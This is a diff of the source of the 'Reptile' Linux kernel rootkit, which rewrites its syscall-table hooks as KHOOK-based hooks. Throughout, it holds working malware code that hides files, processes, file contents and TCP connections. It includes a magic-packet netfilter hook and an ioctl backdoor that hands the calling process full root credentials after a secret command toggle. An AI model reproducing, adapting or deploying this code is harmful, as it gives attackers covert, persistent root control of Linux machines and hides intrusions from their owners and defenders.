 	kdir = kzalloc(ret, GFP_KERNEL);
-	if(kdir == NULL) return ret;
+	if (kdir == NULL)
+		goto final;
 
-	if(copy_from_user(kdir, dirent, ret)) goto end;
+	if (copy_from_user(kdir, dirent, ret))
+		goto end;
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
@@ -612,12 +761,15 @@ asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent
 	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
 #endif
 
-	if(d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)) p = 1;
+	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
+		p = 1;
 
-	while(off < ret) {
+	while (off < ret) {
 		dir = (void *)kdir + off;
-		if((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) || (p && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
-			if(dir == kdir) {
+		if ((!p && (memcmp(hide, dir->d_name, strlen(hide)) == 0)) ||
+		    (p &&
+		     is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
+			if (dir == kdir) {
 				ret -= dir->d_reclen;
 				memmove(dir, (void *)dir + dir->d_reclen, ret);
 				continue;
@@ -628,22 +780,29 @@ asmlinkage int l33t_getdents(unsigned int fd, struct linux_dirent __user *dirent
 		}
 		off += dir->d_reclen;
 	}
-	if(copy_to_user(dirent, kdir, ret)) goto end;
+	if (copy_to_user(dirent, kdir, ret))
+		goto end;
 
-end:	
+end:
 	kfree(kdir);
+
+final:
+	KHOOK_PUT(sys_getdents);
 	return ret;
 }
 
-asmlinkage ssize_t l33t_read(unsigned int fd, char __user *buf, size_t count) {
+KHOOK(sys_read);
+static ssize_t khook_sys_read(unsigned int fd, char __user *buf, size_t count)
+{
 	struct file *f;
 	int fput_needed;
 	ssize_t ret;
-       
-	if(hide_file_content) {
+
+	KHOOK_GET(sys_read);
+
+	if (hide_file_content) {
 		ret = -EBADF;
 
-		atomic_set(&read_on, 1);
 		f = e_fget_light(fd, &fput_needed);
 
 		if (f) {
@@ -651,101 +810,210 @@ asmlinkage ssize_t l33t_read(unsigned int fd, char __user *buf, size_t count) {
 			ret = vfs_read(f, buf, count, &f->f_pos);
 #else
 			ret = vfs_read_addr(f, buf, count, &f->f_pos);
-#endif			
-			if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);
-	    	
+#endif
+			if (f_check(buf, ret) == 1)
+				ret = hide_content(buf, ret);
+
 			fput_light(f, fput_needed);
 		}
-		atomic_set(&read_on, 0);
 	} else {
-		ret = o_read(fd, buf, count);
+		ret = KHOOK_ORIGIN(sys_read, fd, buf, count);
 	}
+
+	KHOOK_PUT(sys_read);
 
 	return ret;
 }
 
-static int __init reptile_init(void) { 
-	char *argv[] = { START, NULL, NULL };
-	
-	atomic_set(&read_on, 0);
-	sct = (unsigned long *)find_sys_call_table();
-	if(!sct) sct = (unsigned long *)get_symbol(SYS_CALL_TABLE);
-	if(!sct) sct = (unsigned long *)generic_find_sys_call_table();			
-	if(!sct) return -1;
-	
-    	o_kill = (void *)sct[__NR_kill];
-    	o_getdents64 = (void *)sct[__NR_getdents64];
-    	o_getdents = (void *)sct[__NR_getdents];
-    	o_read = (void *)sct[__NR_read];
-		
-	write_cr0(read_cr0() & (~0x10000));
-	sct[__NR_kill] = (unsigned long)l33t_kill;		
-	sct[__NR_getdents64] = (unsigned long)l33t_getdents64;		
-	sct[__NR_getdents] = (unsigned long)l33t_getdents;		
-	write_cr0(read_cr0() | 0x10000);
+KHOOK_EXT(int, inet_ioctl, struct socket *sock, unsigned int cmd,
+	  unsigned long arg);
+static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
+			    unsigned long arg)
+{
+	int ret = 0;
+	unsigned int pid;
+	struct control args;
+	struct sockaddr_in addr;
+	struct task_struct *task;
+	struct hidden_conn *hc;
 
-    	magic_packet_hook_options.hook     = (void *) magic_packet_hook;
-    	magic_packet_hook_options.hooknum  = 0;
-    	magic_packet_hook_options.pf       = PF_INET;
-    	magic_packet_hook_options.priority = NF_IP_PRI_FIRST;
+	KHOOK_GET(inet_ioctl);
+	if (cmd == AUTH && arg == HTUA) {
+		if (control_flag) {
+			control_flag = 0;
+		} else {
+			control_flag = 1;
+		}
 
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
-    	nf_register_net_hook(&init_net, &magic_packet_hook_options);
+		goto out;
+	}
+
+	if (control_flag && cmd == AUTH) {
+		if (copy_from_user(&args, (void *)arg, sizeof(args)))
+			goto out;
+
+		switch (args.cmd) {
+		case 0:
+			if (hidden)
+				show();
+			else
+				hide();
+			break;
+		case 1:
+			if (copy_from_user(&pid, args.argv,
+					   sizeof(unsigned int)))
+				goto out;
+
+			if ((task = find_task(pid)) == NULL)
+				goto out;
+
+			task->flags ^= 0x10000000;
+			put_task_struct(task);
+			break;
+		case 2:
+			if (hide_file_content)
+				hide_file_content = 0;
+			else
+				hide_file_content = 1;
+			break;
+		case 3:
+#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
+			current->uid = 0;
+			current->suid = 0;
+			current->euid = 0;
+			current->gid = 0;
+			current->egid = 0;
+			current->fsuid = 0;
+			current->fsgid = 0;
+			cap_set_full(current->cap_effective);
+			cap_set_full(current->cap_inheritable);
+			cap_set_full(current->cap_permitted);
 #else
-    	nf_register_hook(&magic_packet_hook_options);
+			commit_creds(prepare_kernel_cred(0));
 #endif
-    	work_queue = create_workqueue(HIDE);	
-	
-	exec(argv);
+			break;
+		case 4:
+			if (copy_from_user(&addr, args.argv,
+					   sizeof(struct sockaddr_in)))
+				goto out;
+
+			hc = kmalloc(sizeof(*hc), GFP_KERNEL);
+
+			if (!hc)
+				goto out;
+
+			hc->addr = addr;
+
+			list_add(&hc->list, &hidden_tcp_conn);
+			break;
+		case 5:
+			if (copy_from_user(&addr, args.argv,
+					   sizeof(struct sockaddr_in)))
+				goto out;
+
+			list_for_each_entry(hc, &hidden_tcp_conn, list)
+			{
+				if (addr.sin_port == hc->addr.sin_port &&
+				    addr.sin_addr.s_addr ==
+					hc->addr.sin_addr.s_addr) {
+					list_del(&hc->list);
+					kfree(hc);
+					break;
+				}
+			}
+			break;
+		default:
+			goto origin;
+		}
+
+		goto out;
+	}
+
+origin:
+	ret = KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);
+out:
+	KHOOK_PUT(inet_ioctl);
+	return ret;
+}
+
+KHOOK_EXT(int, tcp4_seq_show, struct seq_file *seq, void *v);
+static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+	int ret;
+	struct sock *sk = v;
+	struct inet_sock *inet;
+	struct hidden_conn *hc;
+	unsigned short dport;
+	unsigned int daddr;
+
+	KHOOK_GET(tcp4_seq_show);
+
+	seq_setwidth(seq, TMPSZ - 1);
+	if (v == SEQ_START_TOKEN) {
+		ret = 0;
+		goto out;
+	}
+
+	inet = (struct inet_sock *)sk;
+	dport = inet->inet_dport;
+	daddr = inet->inet_daddr;
+
+	list_for_each_entry(hc, &hidden_tcp_conn, list)
+	{
+		if (hc->addr.sin_port == dport &&
+		    hc->addr.sin_addr.s_addr == daddr) {
+			ret = 0;
+			goto out;
+		}
+	}
+
+	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
+out:
+	KHOOK_PUT(tcp4_seq_show);
+	return ret;
+}
+
+static int __init reptile_init(void)
+{
+	int ret;
+	char *argv[] = {START, NULL, NULL};
+
+	hide();
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 14, 0)
-    	vfs_read_addr = (void *)get_symbol(VFS_READ);
+	vfs_read_addr = (void *)get_symbol(VFS_READ);
 #endif
+	work_queue = create_workqueue(WORKQUEUE);
 
-	write_cr0(read_cr0() & (~0x10000));
-	sct[__NR_read] = (unsigned long)l33t_read;		
-	write_cr0(read_cr0() | 0x10000);
+	magic_packet_hook_options.hook = (void *)magic_packet_hook;
+	magic_packet_hook_options.hooknum = 0;
+	magic_packet_hook_options.pf = PF_INET;
+	magic_packet_hook_options.priority = NF_IP_PRI_FIRST;
 
-	return 0; 
-} 
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
+	nf_register_net_hook(&init_net, &magic_packet_hook_options);
+#else
+	nf_register_hook(&magic_packet_hook_options);
+#endif
+	ret = khook_init();
+	exec(argv);
 
-static void __exit reptile_exit(void) { 
-	if(o_kill){
-		write_cr0(read_cr0() & (~0x10000));
-		sct[__NR_kill] = (unsigned long)o_kill;
-		write_cr0(read_cr0() | 0x10000);
-	}
+	return ret;
+}
 
-	if(o_getdents64){
-		write_cr0(read_cr0() & (~0x10000));
-		sct[__NR_getdents64] = (unsigned long)o_getdents64;
-		write_cr0(read_cr0() | 0x10000);
-	}
-
-	if(o_getdents){
-		write_cr0(read_cr0() & (~0x10000));
-		sct[__NR_getdents] = (unsigned long)o_getdents;
-		write_cr0(read_cr0() | 0x10000);
-	}
-
-	if(o_read) {
-		while(atomic_read(&read_on) != 0) schedule();
-		write_cr0(read_cr0() & (~0x10000));
-		sct[__NR_read] = (unsigned long)o_read;
-		write_cr0(read_cr0() | 0x10000);
-	}
-
-#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
+static void __exit reptile_exit(void)
+{
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
 	nf_unregister_net_hook(&init_net, &magic_packet_hook_options);
 #else
-    	nf_unregister_hook(&magic_packet_hook_options);
+	nf_unregister_hook(&magic_packet_hook_options);
 #endif
-    	flush_workqueue(work_queue);
-    	destroy_workqueue(work_queue);
+
+	flush_workqueue(work_queue);
+	destroy_workqueue(work_queue);
+	khook_cleanup();
 }
 
 module_init(reptile_init);
 module_exit(reptile_exit);
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("F0rb1dd3n - f0rb1dd3n@tuta.io");
-MODULE_DESCRIPTION("Reptile - A linux LKM rootkit");
